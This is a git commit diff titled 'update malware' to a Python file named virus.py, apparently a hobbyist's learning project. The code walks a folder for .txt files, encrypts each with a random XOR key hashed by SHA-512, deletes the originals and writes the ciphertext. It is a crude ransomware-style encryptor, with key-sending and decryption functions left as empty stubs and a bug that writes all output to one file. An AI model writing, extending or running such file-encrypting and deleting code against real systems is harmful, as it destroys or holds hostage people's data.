193353b6aec976e186cdbc3b321595e126b0d3ab
Kassoum Traore <kassoum.traore@africasys.com>
2023-07-04 17:37:38 +0000

    update malware

--- virus.py
+++ virus.py
@@ -1,70 +1,57 @@
-import os
-from hashlib import sha256
-import string
-import random
-import sys
+from os import remove, walk
+from hashlib import sha512
+from string import ascii_letters, digits, punctuation
+from random import sample
+from pathlib import Path
 
-# This list contain all files that we will crypt contain
-all_files = list()
-# end_start = datetime.timestamp(datetime.today())
-# print("Scan time: {} seconds".format(str(end_start)))
+ALL_FILES   = list()
+FILES_PATH  = 'D:/share folder/sources'
+KEY_LENGTH  = 20
+EXTENSION   = ['.txt']
 
-def generate_private_key():
-    all_char = string.ascii_letters + string.digits + string.punctuation
-    return ''.join(random.sample(all_char, 20))
+def generateCipherKey():
+    all_char = ascii_letters + digits + punctuation
+    return ''.join(sample(all_char, KEY_LENGTH))
 
-def open_file(path, mode='r'):
-    """ This method permit to read file """
-    with open(path, mode) as content:
+def readFile(path):
+    with open(path) as content:
         return content.readlines()
 
-def write_in_file(path, content):
-    """ This method permit to read file """
-    with open(path, "w+") as file:
+def replaceFile(file_name, content):
+    with open(f'{FILES_PATH}/test.txt', "w+") as file:
         file.write(content)
 
-def xor_cipher():
-    """ This function use XOR method to crypt file """
-    key = generate_private_key()
-    keys = sha256(key.encode('utf-8')).digest()
+def xorCipher():
+    cipher_key  = generateCipherKey()
+    key_hash    = sha512(cipher_key.encode('utf-8')).digest()
+    print(f'cipher_key: {cipher_key}')
     
-    for i in range(len(all_files)):
-        current_file_path = all_files[i]["path"] +"/"+ all_files[i]["file_name"]
-        current_file_content = open_file(current_file_path, 'r')
+    for file in ALL_FILES:
+        file_content = readFile(file)
+        remove(file)
         
-        os.remove(current_file_path)
+        if len(file_content) != 0:
+            counter = 0
+            for item in file_content:
+                encrypted_data = []
+                for i in range(len(item)):
+                    if counter < len(key_hash) - 1: counter += 1
+                    else: counter = 0
+                    encrypted_data.append(ord(item[i])^key_hash[counter])
+                replaceFile(file, str(bytes(encrypted_data)))
 
-        with open(current_file_path, 'wb') as f_sortie:
-            if len(current_file_content) != 0:
-                all_content = [line.replace('\n', '') for line in current_file_content]
-                counter = 0
-                for item in all_content:
-                    for i in range(len(item)):
-                        char_code = ord(item[i])
-                        mod_char_code = counter % len(keys)
-                        code = bytes([char_code^keys[mod_char_code]])
-                        f_sortie.write(code)
-                        counter += 1
-        
-def search_files(path, extension):
-    """ This function help you to get all files you want """
-    for folder, sub_folder, files in os.walk(path):
-        for item in range(len(files)):
-            file_with_path = dict()
-            if files[item].split(".")[1] in extension:
-                file_with_path["path"] = folder
-                file_with_path["file_name"] = files[item]
-                all_files.append(file_with_path)
+def sendKey(key):
+    ...
 
-# search_files("C:/Users/Kassoum/Documents/tuto/Cyber security/codes/Hacking Tools/save", ["txt"])
+def xorDecipher(cipher_key):
+    ...
 
 if __name__ == '__main__':
-    # xor_cipher()
-    # print(all_files)
-    with os.scandir("C:/Users/Kassoum/Documents/tuto/Cyber security/codes/Hacking Tools/save") as it:
-        for i in it:
-            print(f"{i.name} => {i.stat().st_ctime}")
-            
-    # list_dir = os.scandir()
-    # print(list_dir)
-    
+    try:
+        for folder, sub_folder, files in walk(FILES_PATH):
+            for item in range(len(files)):
+                if Path(files[item]).suffix in EXTENSION:
+                    ALL_FILES.append(f"{folder}/{files[item]}")
+        xorCipher()
+    except Exception as e:
+        print(f'Error: {str(e)}')
